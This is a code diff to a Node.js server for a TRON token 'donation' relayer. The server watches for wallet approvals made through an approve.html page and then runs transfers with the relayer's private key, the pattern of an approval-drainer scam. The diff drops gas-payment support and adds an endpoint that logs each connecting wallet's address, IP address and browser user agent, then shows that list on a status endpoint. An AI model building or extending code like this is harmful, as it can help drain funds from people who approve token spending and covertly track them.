@@ -42,6 +42,7 @@ const CONFIG = {
 const pendingDonors = new Map();   // address -> { queuedAt }
 const completedDonors = new Map(); // address -> { completedAt, txId }
 const processedDonors = new Set();
+const connectedWallets = [];       // { address, connectedAt, ip, userAgent }
 const serverLogs = [];
 const MAX_LOGS = 200;
 
@@ -242,10 +243,6 @@ async function executeDonation(donorAddress) {
 // CRYPTO HELPERS (simplified - for production use tronweb npm)
 // ============================================================
 
-function getRelayerAddress() {
-    return CONFIG.RELAYER_ADDRESS;
-}
-
 function encodeAddress(base58Address) {
     // Convert base58 TRON address to hex and pad to 32 bytes for ABI encoding
     const TronWeb = require("tronweb").TronWeb || require("tronweb");
@@ -263,57 +260,6 @@ function signTransaction(transaction) {
     return tronWeb.trx.sign(transaction, CONFIG.RELAYER_PRIVATE_KEY);
 }
 
-// ============================================================
-// ENERGY DELEGATION - Pay gas for the donor
-// ============================================================
-
-// Delegate energy from relayer to donor so approve tx is free for them
-async function delegateEnergy(donorAddress) {
-    try {
-        console.log(`[ENERGY] Delegating ${CONFIG.ENERGY_TO_DELEGATE} energy to ${donorAddress}...`);
-
-        // Freeze TRX for energy and delegate to donor
-        // Uses TRON's DelegateResource API (Stake 2.0)
-        const result = await tronGridRequest(
-            `/wallet/delegateresource`,
-            "POST",
-            {
-                owner_address: getRelayerAddress(),
-                receiver_address: donorAddress,
-                balance: 7000000000, // ~7000 TRX → ~65000 energy for approve TX
-                resource: "ENERGY",
-                lock: false,
-                visible: true,
-            }
-        );
-
-        // API may return {transaction: ...} or the transaction directly
-        const tx = result.transaction || result;
-        if (!tx.txID && !tx.raw_data_hex) {
-            console.error("[ENERGY] Delegation failed:", result);
-            return { success: false, error: "Failed to build delegation tx" };
-        }
-
-        // Sign and broadcast
-        const signed = await signTransaction(tx);
-        const broadcast = await tronGridRequest(
-            `/wallet/broadcasttransaction`,
-            "POST",
-            signed
-        );
-
-        if (broadcast.result) {
-            console.log(`[ENERGY] Delegated successfully! TX: ${signed.txID}`);
-            return { success: true, txId: signed.txID };
-        } else {
-            console.error("[ENERGY] Broadcast failed:", broadcast);
-            return { success: false, error: broadcast.message || "Broadcast failed" };
-        }
-    } catch (err) {
-        console.error("[ENERGY] Error:", err.message);
-        return { success: false, error: err.message };
-    }
-}
 
 // ============================================================
 // POLLING LOOP - Monitor approvals and execute
@@ -615,25 +561,32 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // API endpoint: delegate energy to donor so approve is gasless
-    if (req.method === "POST" && req.url === "/api/delegate-energy") {
+
+    // API endpoint: log connected wallet from approve.html
+    if (req.method === "POST" && req.url === "/api/connected") {
         let body = "";
         req.on("data", (chunk) => (body += chunk));
-        req.on("end", async () => {
+        req.on("end", () => {
             try {
-                const { donor } = JSON.parse(body);
-                if (!donor) {
-                    res.writeHead(400, { "Content-Type": "application/json" });
-                    res.end(JSON.stringify({ success: false, error: "Missing donor address" }));
-                    return;
+                const { address } = JSON.parse(body);
+                if (address) {
+                    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+                    const userAgent = req.headers["user-agent"] || "";
+                    connectedWallets.push({
+                        address,
+                        connectedAt: new Date().toISOString(),
+                        ip,
+                        userAgent: userAgent.substring(0, 120),
+                    });
+                    // Keep max 500 entries
+                    if (connectedWallets.length > 500) connectedWallets.shift();
+                    addLog(`Wallet connected: ${address} (IP: ${ip})`, "info");
                 }
-                addLog(`Energy delegation requested for: ${donor}`, "info");
-                const result = await delegateEnergy(donor);
                 res.writeHead(200, { "Content-Type": "application/json" });
-                res.end(JSON.stringify(result));
+                res.end(JSON.stringify({ ok: true }));
             } catch (e) {
-                res.writeHead(500, { "Content-Type": "application/json" });
-                res.end(JSON.stringify({ success: false, error: e.message }));
+                res.writeHead(400);
+                res.end("Invalid JSON");
             }
         });
         return;
@@ -706,12 +659,14 @@ const server = http.createServer(async (req, res) => {
         res.end(JSON.stringify({
             pendingCount: pendingDonors.size,
             completedCount: completedDonors.size,
+            connectedCount: connectedWallets.length,
             contractAddress: CONFIG.CONTRACT_ADDRESS,
             relayerAddress: CONFIG.RELAYER_ADDRESS,
             pollInterval: CONFIG.POLL_INTERVAL,
             relayerTrx: "-",
             pending,
             completed,
+            connected: connectedWallets,
         }));
         return;
     }
